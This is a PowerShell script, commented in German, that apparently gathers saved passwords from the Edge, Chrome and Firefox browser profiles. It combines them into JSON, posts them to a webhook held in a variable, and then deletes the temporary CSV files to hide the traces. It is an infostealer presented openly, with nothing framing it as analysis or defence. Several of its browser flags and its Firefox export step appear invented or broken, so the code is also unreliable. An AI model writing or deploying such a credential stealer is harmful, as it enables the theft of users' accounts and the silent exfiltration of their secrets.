# Funktion zum Exportieren von Passwörtern aus Edge
function Export-EdgePasswords {
    $EdgeProfilePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    $EdgeExportPath = "$env:TEMP\edge_passwords.csv"
    Start-Process -FilePath "msedge.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$EdgeExportPath" -Wait
    return Import-Csv $EdgeExportPath
}

# Funktion zum Exportieren von Passwörtern aus Chrome
function Export-ChromePasswords {
    $ChromeProfilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    $ChromeExportPath = "$env:TEMP\chrome_passwords.csv"
    Start-Process -FilePath "chrome.exe" -ArgumentList "--headless", "--profile-directory=Default", "--password-store=basic", "--export-passwords=$ChromeExportPath" -Wait
    return Import-Csv $ChromeExportPath
}

# Funktion zum Exportieren von Passwörtern aus Firefox
function Export-FirefoxPasswords {
    $TopDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $DefaultProfileDir = (Get-ChildItem -LiteralPath $TopDir -Directory | Where-Object { $_.FullName -match '\.default' }).FullName
    $ExportPath = "$env:TEMP\firefox_passwords.csv"
    Start-Process -FilePath "firefox.exe" -ArgumentList "-headless", "-profile", $DefaultProfileDir, "-new-instance", "about:logins?action=export" -Wait
    
    # Warten, bis die Datei erstellt wurde
    Start-Sleep -Seconds 5
    
    return Import-Csv $ExportPath
}

# Passwörter exportieren
$EdgePasswords = Export-EdgePasswords
$ChromePasswords = Export-ChromePasswords
$FirefoxPasswords = Export-FirefoxPasswords

# Alle Passwörter kombinieren
$AllPasswords = @($EdgePasswords) + @($ChromePasswords) + @($FirefoxPasswords)

# JSON-Payload erstellen
$JsonPayload = @{
    "passwords" = $AllPasswords
} | ConvertTo-Json

# Daten an Webhook senden
$Parameters = @{
    "Uri"         = $whuri
    "Method"      = "POST"
    "Body"        = $JsonPayload
    "ContentType" = "application/json"
}

Invoke-RestMethod @Parameters

# Temporäre CSV-Dateien löschen
Remove-Item "$env:TEMP\edge_passwords.csv"
Remove-Item "$env:TEMP\chrome_passwords.csv"
Remove-Item "$env:TEMP\firefox_passwords.csv"
